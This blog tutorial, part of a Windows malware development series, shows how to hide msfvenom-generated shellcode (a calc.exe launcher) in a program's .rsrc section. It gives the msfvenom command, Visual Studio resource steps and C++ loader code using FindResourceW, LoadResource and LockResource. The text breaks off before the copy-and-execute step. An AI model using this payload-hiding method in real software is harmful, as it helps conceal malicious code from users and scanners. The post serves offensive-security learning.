---
title: "Windows Malware Development Part 4: Payload Placement Basics - .rsrc"
header:
  teaser: /assets/images/pe.png
  teaser_home_page: true
categories:
  - Malware Dev
classes: wide
tags:
  - Malware
toc: true
toc_label: Contents
---
## Objective ##

Hey guys, welcome to the fourth part of Windows Malware Development, in which we will be looking at the final part of the basics of payload placement. In this post, we will be looking at how to place our shellcode in the `.rsrc` section.

## .rsrc Section ##

If you recall from the PE file structure post, the `.rsrc` section contains any resources that our program needs to load in order to function. From a Malware development perspective however, we can use this section our advantage. Our shellcode will now be hidden in the resources section of our program, away from plain sight.

>You will need Visual Studio/Visual studio build tools, x64dbg and Metasploit (comes with a build of Kali Linux) for this exercise.
>
>For this post, I will be using the Visual Studio GUI for the purposes of simplicity, since its easier to create and add a resource using the GUI. However, it is still possible without it.

We will be changing our shellcode in this post to actually execute something, and in the process learn how to use the Metasploit Framework in order to generate shellcode.

## Creating the Shellcode and Resource File ##

### Generating Shellcode using the Metasploit Framework ###

Readers who come from a penetration testing and red teaming background would know that the Metasploit Framework offers many tools that aid with these tasks. One of those tools is `msfvenom`, which is a console tool that can be used to generate different types of payloads and shellcode.

We will be using `msfvenom` in order to generate shellcode that launches `calc.exe` (The Windows Calculator) using `CMD`.

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/exec CMD=calc.exe > pay.ico 
```

- `-p windows/x64/exec`: This is the payload type. There are many types of payloads, for example, if you want to generate a reverse shell shellcode you will be using a different payload type. In this case, we are using a command execution payload type.
- `CMD= calc.exe`: The command that we wish to execute, which in this case, is `calc.exe`.
- `> pay.ico`: The output file containing our shellcode. You can use any acceptable resource file extension, but in this case we will be using the `.ico` (ICON file) extension.

If we try to view our file, it will appear to be a bunch of binary data, however, we can see the word `calc.exe`:

```
┌──(kali㉿kali)-[~]
└─$ cat '/home/kali/Desktop/pay.ico'       
A�8�u�LLE9�u�XD�@$I�fA�H�P�H▒D�@ I��VH��A�4�H�M1�H1��A��
                       HD�@I�A��H�AXAX^YZAXAYAZH�� AR��XAYZH��W���]H�H��A�1�o��ջ���VA�������H��(<|
���u�GrojYA����calc.exe 
```

### Adding the File as a Resource ###

Now that our shellcode file is ready, let's add it as a resource for our program. 

- Start by creating a blank C++ project in Visual Studio. 
- In the solution explorer pane (right-hand side of the screen), right-click on the Resource Files icon, and select Add > New Item and view all the templates.
- Select Resource from the left pane and add a Resource File (.rc). Leave the name as is.
- You will see a new pane labeled Resource View open in place of the solution explorer. Right-click on the Resource.rc icon and click on Add Resource.
- In the new window, click on Import, and import your `.ico` shellcode file.
- Enter `RCDATA` as the Resource Type and click OK.

![RCDATA](/assets/images/rcdata.png)

- You will now see your resource displayed as binary data.

Navigate back to the solution explorer pane and have a look at the `resource.h` header file. The `#define` statement that you see is your payload's ID in the `.rsrc` section (in this case, `IDR_RCDATA1`), and will be needed later when we're loading it,

```cpp
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Resource.rc
//
#define IDR_RCDATA1                     101

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
```

## Writing the program ##

Start off by adding a C++ file to you project (if not done already). Let's start writing the program. The flow would go as follows:

- Fetch resource location.
- Fetch a handle to the loaded resource.
- Get the address of our shellcode in the `.rsrc` section.
- Get the size of our shellcode.
- Copy to an executable memory buffer.
- Execute it.

### Fetching the location of our resource ###

We will be using the `FindResourceW` API for this operation. Taking a look at the documentation, we can see that it takes three parameters:

```cpp
HRSRC FindResourceW(
  [in, optional] HMODULE hModule,
  [in]           LPCWSTR lpName,
  [in]           LPCWSTR lpType
);
```

- `[in, optional] hModule`: Handle to the module containing the PE file with the resource.
- `[in] lpName`: Resource ID. This parameter can be `MAKEINTRESOURCE(ID)`.
- `[in] lpType`: Resource type.

We are going to fetch the location of our resource using the resource ID that we saw earlier, which will be our second parameter. We will be passing it through the function `MAKEINTRESOURCEW()` in order to pass this ID to the API.

Also, our resource type will be passed as `RT_RCDATA`, as you remember that we had set it while importing the resource file.

```cpp
int main() {
    HRSRC       hRsrc = NULL;
    HGLOBAL     hGlobal = NULL;
    PVOID       pPayloadAddress = NULL;
    SIZE_T      sPayloadSize = NULL;

    // Get the location to the data stored in .rsrc by its id
    hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hRsrc == NULL) {
        // in case of function failure
        printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
        return -1;
    }
```

### Getting a handle to the specified resource data

The next step requires us to get a handle to the specified resource data, which will be required in the next step in order to locate our shellcode. To perform this operation, we will be using the `LoadResource` API.

```cpp
HGLOBAL LoadResource(
  [in, optional] HMODULE hModule,
  [in]           HRSRC   hResInfo
);
```

- `[in, optional] hModule`: A handle to the module whose executable file contains the resource. 
- `[in] hResInfo`: A handle to the resource to be loaded.

This API requires us to pass a handle to the resource, which we acquired from the previous step (`hRsrc`). We are going to store the handle returned in the `hGlobal` variable as follows:

```cpp
hGlobal = LoadResource(NULL, hRsrc);
if (hGlobal == NULL) {
    // in case of function failure
    printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
    return -1;
}
```

### Getting the address of our payload

We will be using the `LockResource` API for this task. This API will return a pointer to where our payload is located in the resource's memory.

```cpp
LPVOID LockResource(
  [in] HGLOBAL hResData
);
```

- ```[in] hResData```: A handle to the resource to be accessed. The ```LoadResource``` function returns this handle.

 It takes the previously returned value as its only parameter.

```cpp
pPayloadAddress = LockResource(hGlobal);
if (pPayloadAddress == NULL) {
    // in case of function failure
    printf("[!] LockResource Failed With Error : %d \n", GetLastError());
    return -1;
}
```
